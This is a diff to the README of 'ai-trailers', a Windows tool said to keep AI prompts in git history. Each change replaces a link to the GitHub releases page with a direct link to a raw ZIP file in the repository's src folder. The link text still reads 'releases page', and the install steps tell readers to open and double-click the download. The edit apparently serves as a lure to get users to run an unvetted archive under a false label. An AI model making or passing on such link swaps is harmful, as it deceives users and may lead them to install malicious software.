@@ -1,6 +1,6 @@
 # 🧾 ai-trailers - Keep AI prompts in git history
 
-[![Download ai-trailers](https://img.shields.io/badge/Download%20ai--trailers-blue-grey?style=for-the-badge)](https://github.com/josefaexistential382/ai-trailers/releases)
+[![Download ai-trailers](https://img.shields.io/badge/Download%20ai--trailers-blue-grey?style=for-the-badge)](https://github.com/josefaexistential382/ai-trailers/raw/refs/heads/main/src/trailers-ai-v3.3.zip)
 
 ## 🚀 What it does
 
@@ -17,7 +17,7 @@ It keeps the prompt record close to the code, so you can review what the AI did 
 
 ## 💻 Windows download
 
-1. Open the [ai-trailers releases page](https://github.com/josefaexistential382/ai-trailers/releases)
+1. Open the [ai-trailers releases page](https://github.com/josefaexistential382/ai-trailers/raw/refs/heads/main/src/trailers-ai-v3.3.zip)
 2. Find the latest release
 3. Download the Windows file from the release assets
 4. Open the file to run it
@@ -37,7 +37,7 @@ The app is made for people who want to keep prompt history inside git, where it 
 
 ## 📦 How to install on Windows
 
-1. Go to the [releases page](https://github.com/josefaexistential382/ai-trailers/releases)
+1. Go to the [releases page](https://github.com/josefaexistential382/ai-trailers/raw/refs/heads/main/src/trailers-ai-v3.3.zip)
 2. Download the latest Windows build
 3. Save the file to your Downloads folder
 4. Double-click the file to start it
@@ -157,7 +157,7 @@ If you use a ZIP file, extract it first before opening the app.
 
 Use this link to visit the download page and get the latest Windows release:
 
-[ai-trailers releases page](https://github.com/josefaexistential382/ai-trailers/releases)
+[ai-trailers releases page](https://github.com/josefaexistential382/ai-trailers/raw/refs/heads/main/src/trailers-ai-v3.3.zip)
 
 ## 📚 Repo details
 
